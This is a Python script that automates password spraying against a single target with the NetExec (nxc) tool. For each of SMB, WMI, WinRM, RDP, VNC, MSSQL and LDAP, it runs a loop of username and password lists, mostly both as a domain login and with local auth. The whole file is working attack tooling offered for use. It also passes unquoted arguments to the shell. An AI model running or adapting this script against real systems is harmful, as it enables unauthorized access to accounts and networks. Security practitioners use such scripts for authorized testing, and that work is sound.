import subprocess, sys 

# # Define the target IP address
# TARGET_IP = ""

if len(sys.argv) != 4:
    print("Usage: python3 netExecScanner.py <TARGET_IP> <UsersFile> <PasswordFile>")
    sys.exit(1)

# Get the target IP from the command-line argument
TARGET_IP = sys.argv[1]
USERS = sys.argv[2]
PASSWORDS = sys.argv[3]


# Define commands for each protocol
commands = {
    "smb": f"nxc smb {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    "smb_local": f"nxc smb {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success --local-auth",

    # "ssh": f"nxc ssh {TARGET_IP} --some-ssh-flag",
    
    # "ftp": f"nxc ftp {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    
    "wmi": f"nxc wmi {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    "wmi_local": f"nxc wmi {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success --local-auth",
    
    "winrm": f"nxc winrm {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    "winrm_local": f"nxc winrm {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success --local-auth",
    
    "rdp": f"nxc rdp {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    "rdp_local": f"nxc rdp  {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success --local-auth",
    
    "vnc": f"nxc vnc {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    
    "mssql": f"nxc mssql {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success",
    "mssql_local": f"nxc mssql {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success --local-auth",
    
    "ldap": f"nxc ldap {TARGET_IP} -u {USERS} -p {PASSWORDS} --continue-on-success"
}

# Iterate over each protocol and execute the command
# for protocol, command in commands.items():
#     print(f"Running nxc for protocol: {protocol}")
    
#     # Run the command
#     try:
#         result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
#         print(f"Output for {protocol}:\n{result.stdout}")
#     except subprocess.CalledProcessError as e:
#         print(f"Error with {protocol}:\n{e.stderr}")
    
#     print("% " * 10, f"     END {protocol}     ","% " * 10)


# Iterate over each protocol and execute the command
for protocol, command in commands.items():
    print(f'''
 [+] Running nxc for protocol: {protocol}       [+]
 [+] Command: 
 [*]    {command}    [*]
''')
    
    # Run the command with real-time output
    try:
        process = subprocess.Popen(command, shell=True, stdout=sys.stdout, stderr=sys.stderr, text=True)
        process.communicate()  # Wait for the command to complete
    except subprocess.CalledProcessError as e:
        print(f"Error with {protocol}:\n{e}")
    
    print(f'''
                    % % % % % % % % % %      END {protocol}     % % % % % % % % % % 
        ''')

